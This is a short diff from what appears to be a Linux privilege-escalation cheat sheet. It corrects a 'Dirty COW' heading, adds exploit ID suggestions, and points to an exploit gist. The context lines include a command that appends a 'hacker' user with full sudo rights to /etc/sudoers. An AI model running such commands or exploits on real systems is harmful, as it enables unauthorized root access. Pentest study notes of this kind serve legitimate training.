@@ -469,12 +469,12 @@ python linprivchecker.py extended
 # Add user to sudoers
 echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
 ```
-## Dirty COw
+## Dirty COW
 ```
 uname -a or uname -r
 Works on Linux Kernel 2.6.22 < 3.9
-
-can also try the follwoing if searchsploit doesnt work https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679 
+Try 40839 or 40616 first
+can also try the following if above & searchsploit doesnt work https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679 
 ```
 ### Basic info
 
